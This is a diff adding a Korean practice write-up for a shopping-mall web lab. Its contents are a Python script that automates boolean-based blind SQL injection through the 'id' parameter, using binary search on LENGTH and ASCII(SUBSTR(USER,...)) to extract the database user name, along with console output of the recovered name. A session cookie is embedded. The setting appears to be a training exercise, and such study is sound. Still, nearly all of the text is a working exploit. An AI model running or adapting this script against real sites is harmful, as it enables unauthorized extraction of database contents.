@@ -1,0 +1,62 @@
+============================
+쇼핑몰 1번 - 자동화 스크립트
+============================
+
+* 유저명 자동 탈취
+* 이진탐색, 빨리 찾을 수 있는 알고리즘 적용
+* 멀티스레드, 멀티프로세스 사용 X
+
+1. 소스코드
+import requests
+
+URL = "https://lab.eqst.co.kr:8110/practice/practice01/detail"
+COOKIE = {"EQSTORESESSIONID": "13481A51C00F8F236804BA273D259B89"}
+
+s = requests.Session()
+s.cookies.update(COOKIE)
+
+def check(q):
+    r = s.get(URL, params={"id": f"61 AND {q}"}, timeout=5)
+    return "지포스" in r.text
+
+def find(q, lo, hi):
+    while lo < hi:
+        mid = (lo + hi) // 2
+
+        if check(f"({q})>{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+
+    return lo
+
+length = find("LENGTH(USER)", 1, 32)
+
+user = ""
+
+for i in range(1, length + 1):
+    ascii_code = find(
+        f"ASCII(SUBSTR(USER,{i},1))",
+        32,
+        126
+    )
+
+    user += chr(ascii_code)
+    print(f"[{i}/{length}] {user}")
+
+print(f"\nDB USER : {user}")
+
+2. 콘솔창 출력  
+C:\Users\EZ\OneDrive\문서>python 쇼핑몰_1번.py                
+[1/8] U
+[2/8] US
+[3/8] USE
+[4/8] USEW
+[5/8] USEWO
+[6/8] USEWOR
+[7/8] USEWORL
+[8/8] USEWORLD
+
+DB USER : USEWORLD
+
+============================
